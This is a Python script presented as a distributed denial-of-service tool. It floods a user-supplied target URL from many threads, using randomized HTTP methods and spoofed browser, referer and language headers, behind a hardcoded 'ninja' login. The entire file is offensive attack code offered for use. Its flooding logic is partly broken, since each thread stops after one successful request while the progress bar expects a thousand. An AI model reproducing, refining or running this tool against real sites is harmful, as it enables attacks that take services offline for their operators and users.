import urllib.request
import threading
import random
import logging
from concurrent.futures import ThreadPoolExecutor
import time
from termcolor import colored
from tqdm import tqdm
import argparse
import sys
import base64

# Banner for TCH DDOS
def print_banner():
    banner = """
    ╔════════════════════════════════════════════════════════════════╗
    ║ ████████████████████████████████████████████████████╗         ║
    ║ ████████╗████████╗███████╗ █████╗ ███╗   ███╗███████╗         ║
    ║ ██╔════╝╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██╔════╝         ║
    ║ ███████╗   ██║   █████╗  ███████║██╔████╔██║█████╗           ║
    ║ ╚════██║   ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║██╔══╝           ║
    ║ ███████║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║███████╗         ║
    ║ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝         ║
    ║        Distributed Denial of Service Tool (v4.3)              ║
    ║                Developed by TCH - [Enhanced Edition]           ║
    ║         Now with Enhanced Styling & Faster Request Handling    ║
    ╚════════════════════════════════════════════════════════════════╝
    """
    print(colored(banner, 'cyan', attrs=['bold']))

# Logging setup for DDOS attack events
logging.basicConfig(filename='ddos_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

# Argument parser for configurable parameters
def parse_arguments():
    parser = argparse.ArgumentParser(description='TCH DDOS Tool')
    parser.add_argument('url', type=str, help='Target URL for the attack')
    parser.add_argument('threads', type=int, help='Number of concurrent threads')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds')
    parser.add_argument('--delay', type=float, default=0.5, help='Delay between requests in seconds')
    parser.add_argument('--retry', type=int, default=3, help='Number of retries for failed requests')
    return parser.parse_args()

# Ask for username and password
def prompt_for_credentials():
    print(colored("Please enter your credentials to continue.", 'yellow'))
    username = input(colored("Username: ", 'cyan'))
    password = input(colored("Password: ", 'cyan'))
    return username, password

# List of random User-Agents, referers, accept-languages
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
]
referers = ['https://www.google.com/', 'https://www.bing.com/']
accept_languages = ['en-US,en;q=0.9', 'fr-FR,fr;q=0.9']
http_methods = ["GET", "POST", "HEAD"]

# Attack statistics
success_count = 0
error_count = 0
total_requests = 0
lock = threading.Lock()

# Progress bar setup
progress_bar = tqdm(total=0, desc="Total Requests", unit="req", ncols=100, bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed} < {remaining}, {rate_fmt}]')

# Generate a request with random headers, method, and optional authentication
def create_request(url, username=None, password=None):
    method = random.choice(http_methods)
    headers = {
        'User-Agent': random.choice(user_agents),
        'Referer': random.choice(referers),
        'Accept-Language': random.choice(accept_languages),
    }
    
    if username and password:
        credentials = f"{username}:{password}"
        encoded_credentials = base64.b64encode(credentials.encode('utf-8')).decode('utf-8')
        headers['Authorization'] = f'Basic {encoded_credentials}'
    
    req = urllib.request.Request(url, headers=headers, method=method)
    return req

# Function to perform the attack with retry support
def attack(url, timeout, delay, retry_count, username=None, password=None):
    global success_count, error_count, total_requests
    for attempt in range(retry_count):
        try:
            req = create_request(url, username, password)
            response = urllib.request.urlopen(req, timeout=timeout)
            status_code = response.status
            with lock:
                success_count += 1
                total_requests += 1
                progress_bar.update(1)
                progress_bar.set_description(f"Success: {success_count} | Errors: {error_count}")
            
            if status_code == 200:
                status_message = colored(f"[+] Success: {url} | Method: {req.method} | Status: {status_code}", 'green')
            elif status_code == 502:
                status_message = colored(f"[+] Bad Gateway: {url} | Method: {req.method} | Status: {status_code}", 'yellow')
            else:
                status_message = colored(f"[+] Status: {url} | Method: {req.method} | Status: {status_code}", 'blue')

            logging.info(f"Request sent to {url} | Status: {status_code}")
            print(status_message)
            break  # Exit loop after a successful request
        
        except urllib.error.HTTPError as e:
            error_message = colored(f"[-] HTTP Error: {str(e)} | Status Code: {e.code}", 'red')
            with lock:
                error_count += 1
                total_requests += 1
                progress_bar.update(1)
            logging.error(f"Request failed: {e}")
            print(error_message)

        except urllib.error.URLError as e:
            error_message = colored(f"[-] URL Error: {str(e)}", 'red')
            with lock:
                error_count += 1
                total_requests += 1
                progress_bar.update(1)
            logging.error(f"Request failed: {e}")
            print(error_message)

        except Exception as e:
            error_message = colored(f"[-] Error: {str(e)}", 'red')
            with lock:
                error_count += 1
                total_requests += 1
                progress_bar.update(1)
            logging.error(f"Request failed: {e}")
            print(error_message)

        time.sleep(random.uniform(0.1, delay))

# Main function
if __name__ == "__main__":
    print_banner()
    args = parse_arguments()

    url = args.url
    thread_count = args.threads
    timeout = args.timeout
    delay = args.delay
    retry_count = args.retry

    # Prompt for credentials
    username, password = prompt_for_credentials()

    if username != "ninja" or password != "ninja":
        print(colored("Invalid credentials. Exiting...", 'red'))
        sys.exit(1)

    # Display target URL
    print(colored(f"Target URL: {url}", 'cyan'))
    print(colored(f"Attack initiated with {thread_count} threads.", 'green'))

    progress_bar.total = thread_count * 1000  # Estimate requests per thread

    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        for _ in range(thread_count):
            executor.submit(attack, url, timeout, delay, retry_count, username, password)

    print(f"\nTotal Requests: {total_requests} | Successful: {success_count} | Errors: {error_count}")
    